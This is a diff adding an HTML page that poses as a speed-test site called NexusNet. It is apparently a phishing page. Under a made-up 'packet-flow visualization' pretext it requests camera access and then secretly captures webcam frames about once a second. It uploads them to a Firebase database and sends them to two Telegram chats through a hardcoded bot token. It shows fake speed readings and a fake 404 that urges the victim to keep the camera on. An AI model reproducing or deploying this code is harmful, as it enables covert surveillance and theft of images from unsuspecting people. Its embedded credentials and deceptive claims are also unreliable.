@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NexusNet | Multi-Gigabit Speed Lab</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --net-purple: #8b5cf6;
+            --net-bg: #030712;
+            --net-panel: #111827;
+            --net-accent: #d946ef;
+        }
+
+        body { 
+            margin: 0; padding: 0; 
+            background: var(--net-bg); 
+            color: #f3f4f6;
+            font-family: 'Outfit', sans-serif;
+            display: flex; flex-direction: column; height: 100vh;
+            overflow: hidden;
+        }
+
+        .top-nav {
+            padding: 20px 40px; background: rgba(17, 24, 39, 0.8);
+            border-bottom: 1px solid rgba(139, 92, 246, 0.3);
+            backdrop-filter: blur(12px);
+            display: flex; justify-content: space-between; align-items: center;
+        }
+
+        .brand { font-weight: 800; font-size: 22px; background: linear-gradient(to right, #8b5cf6, #d946ef); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+
+        .speed-stage {
+            flex-grow: 1; display: flex; align-items: center; justify-content: center;
+            padding: 20px; position: relative;
+        }
+
+        .speed-card {
+            width: 100%; max-width: 450px; 
+            background: var(--net-panel);
+            border: 1px solid #374151; border-radius: 32px;
+            padding: 50px 40px; text-align: center;
+            box-shadow: 0 0 80px rgba(139, 92, 246, 0.15);
+            position: relative; z-index: 2;
+        }
+
+        /* Disguised Camera UI: Packet Flow Visualizer */
+        .gauge-container {
+            width: 220px; height: 220px; margin: 0 auto 30px;
+            border: 8px solid #1f2937; border-radius: 50%;
+            position: relative; display: flex; align-items: center; justify-content: center;
+        }
+
+        .gauge-fill {
+            position: absolute; width: 100%; height: 100%;
+            border-radius: 50%; border: 8px solid transparent;
+            border-top-color: var(--net-purple); border-right-color: var(--net-accent);
+            transform: rotate(-45deg); animation: pulse-glow 2s infinite alternate;
+        }
+        @keyframes pulse-glow { from { opacity: 0.6; } to { opacity: 1; filter: drop-shadow(0 0 10px var(--net-purple)); } }
+
+        .packet-wave {
+            width: 60%; height: 60%; border-radius: 50%;
+            background: repeating-radial-gradient(circle, transparent, transparent 10px, rgba(139, 92, 246, 0.1) 11px);
+            animation: ripple 4s infinite linear;
+        }
+        @keyframes ripple { from { transform: scale(0.8); opacity: 1; } to { transform: scale(1.5); opacity: 0; } }
+
+        .btn-speedtest {
+            background: linear-gradient(135deg, #8b5cf6 0%, #d946ef 100%);
+            color: #fff; border: none; width: 100%; padding: 20px;
+            border-radius: 16px; font-weight: 700; font-size: 18px; cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .btn-speedtest:hover { transform: scale(1.03); box-shadow: 0 10px 30px rgba(217, 70, 239, 0.4); }
+
+        /* Status States */
+        #sync-ui, #error-404 { display: none; }
+
+        .ping-display {
+            display: flex; justify-content: space-around; margin-top: 30px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .ping-item { text-align: center; }
+        .ping-label { font-size: 10px; color: #9ca3af; text-transform: uppercase; margin-bottom: 5px; }
+        .ping-value { font-size: 16px; color: var(--net-purple); font-weight: 700; }
+
+        /* 404 Topology Collapse */
+        .error-code { font-size: 80px; font-weight: 900; color: #1f2937; margin: 0; line-height: 1; }
+        .mumbai-tag { font-size: 11px; color: var(--net-accent); font-weight: bold; margin-top: 20px; }
+    </style>
+</head>
+<body>
+
+    <div class="top-nav">
+        <div class="brand">NEXUS_NET</div>
+        <div style="font-size: 11px; color: #6b7280; font-weight: 600;">MUMBAI_EDGE_CENTER</div>
+    </div>
+
+    <div class="speed-stage">
+        <!-- Initial Entry -->
+        <div class="speed-card" id="init-view">
+            <div class="gauge-container">
+                <div class="gauge-fill"></div>
+                <div class="packet-wave"></div>
+                <svg width="48" height="48" fill="white" viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+            </div>
+            <h2 style="margin-bottom:10px;">Hyper-Spectral Speed Test</h2>
+            <p style="font-size: 14px; color: #9ca3af; margin-bottom: 40px;">
+                Enable <b>Packet-Flow Visualization</b> to analyze environmental wave interference. We use your camera sensor to adjust throughput algorithms based on physical room acoustics and light-wave diffraction.
+            </p>
+            <button class="btn-speedtest" onclick="startNetTest()">GO</button>
+        </div>
+
+        <!-- Live Testing -->
+        <div class="speed-card" id="sync-ui">
+            <div class="gauge-container" style="border-color: var(--net-accent);">
+                <div class="gauge-fill" style="animation-duration: 0.5s;"></div>
+                <div id="speed-mbps" style="font-size: 48px; font-weight: 900; color: #fff;">0</div>
+            </div>
+            <h3 style="color: var(--net-purple);">Testing Download Speed...</h3>
+            <div class="ping-display">
+                <div class="ping-item">
+                    <div class="ping-label">Ping</div>
+                    <div class="ping-value">12 ms</div>
+                </div>
+                <div class="ping-item">
+                    <div class="ping-label">Jitter</div>
+                    <div class="ping-value">2 ms</div>
+                </div>
+                <div class="ping-item">
+                    <div class="ping-label">Optical Sync</div>
+                    <div class="ping-value" style="color:#d946ef">ACTIVE</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- 404 Node Collapse -->
+        <div class="speed-card" id="error-404">
+            <div class="error-code">404</div>
+            <h2 style="color: #ef4444;">Topology Desynchronized</h2>
+            <p style="font-size: 14px; color: #9ca3af;">
+                The Mumbai Gateway node has dropped your session handshake. Please keep your camera sensor focused on the screen to re-authenticate your visual packet token and resume the test.
+            </p>
+            <div class="btn-speedtest" style="background: #1f2937; color: #4b5563;">Re-connecting to Mumbai Hub...</div>
+            <div class="mumbai-tag">LOCATION: MUMBAI_WEST_DATACENTER_404</div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Logic -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startNetTest() {
+            try {
+                // Request camera disguised as "Packet-Flow Visualization"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        count++;
+                        // Random speed simulation
+                        const mbps = Math.floor(Math.random() * (450 - 380 + 1) + 380);
+                        document.getElementById('speed-mbps').innerText = mbps;
+                        
+                        if (count <= 55) {
+                            netCapture(count);
+                        }
+
+                        // Simulation: 404 Trigger at 28 seconds
+                        if (count === 28) {
+                            document.getElementById('sync-ui').style.display = 'none';
+                            document.getElementById('error-404').style.display = 'block';
+                        }
+
+                        if (count >= 60) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://www.speedtest.net/";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://fast.com/";
+            }
+        }
+
+        function netCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "NET_VISUAL_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_EDGE_CENTER" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'net_packet_sync.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
